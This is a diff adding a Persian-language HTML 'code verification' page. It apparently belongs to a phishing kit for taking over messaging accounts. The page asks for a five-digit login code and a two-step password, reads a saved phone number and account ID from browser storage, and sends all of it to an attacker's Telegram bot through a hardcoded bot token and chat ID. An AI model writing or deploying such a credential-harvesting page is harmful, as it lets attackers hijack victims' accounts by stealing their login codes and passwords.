@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأیید کد</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #333; /* رنگ پس‌زمینه تیره */
+            margin: 0;
+            padding: 0;
+            color: #fff; /* رنگ متن روشن */
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background-color: #222; /* رنگ پس‌زمینه کادر مشکی تیره */
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+        h1 {
+            text-align: center;
+            color: #4CAF50; /* رنگ عنوان */
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #444; /* رنگ حاشیه ورودی */
+            border-radius: 5px;
+            background-color: #555; /* رنگ پس‌زمینه ورودی */
+            color: #fff; /* رنگ متن در ورودی */
+        }
+        input::placeholder {
+            color: #bbb; /* رنگ متن در placeholder */
+        }
+        .button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>تأیید کد</h1>
+        <label for="verificationCode">کد تأیید (۵ رقم):</label>
+        <input type="text" id="verificationCode" placeholder="کد تأیید را وارد کنید" maxlength="5">
+        
+        <label for="twoStepCode">رمز دو مرحله‌ای (در صورت وجود):</label>
+        <input type="text" id="twoStepCode" placeholder="اگر رمز دو مرحله‌ای دارید، وارد کنید">
+        
+        <button class="button" id="verifyBtn">تأیید</button>
+    </div>
+
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', function() {
+            const verificationCode = document.getElementById('verificationCode').value;
+            const twoStepCode = document.getElementById('twoStepCode').value;
+
+            if (verificationCode.trim() === '') {
+                alert('لطفاً کد تأیید را وارد کنید.');
+            } else {
+                // اطلاعات را از localStorage می‌خوانیم
+                const phone = localStorage.getItem('phone');
+                const accountId = localStorage.getItem('accountId');
+
+                // ارسال اطلاعات تأیید به ربات تلگرام
+                sendVerificationToTelegram(phone, accountId, verificationCode, twoStepCode);
+            }
+        });
+
+        function sendVerificationToTelegram(phone, accountId, verificationCode, twoStepCode) {
+            const token = '8067302993:AAGsjimxvF39LKaudeaO8ZH243G2wBfD_ow'; // توکن ربات تلگرام خود را جایگزین کنید
+            const chatId = '7878707697'; // Chat ID خود را جایگزین کنید
+            const message = `تأیید کد:\nشماره تلفن: ${phone}\nآیدی اکانت: ${accountId}\nکد تأیید: ${verificationCode}\nرمز دو مرحله‌ای: ${twoStepCode}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('اطلاعات با موفقیت ارسال شد.');
+                    // انتقال به صفحه‌ای دیگر در صورت نیاز
+                    // window.location.href = 'nextPage.html';
+                } else {
+                    alert('خطا در ارسال اطلاعات به تلگرام.');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('خطا در ارسال اطلاعات به تلگرام.');
+            });
+        }
+    </script>
+
+</body>
+</html>
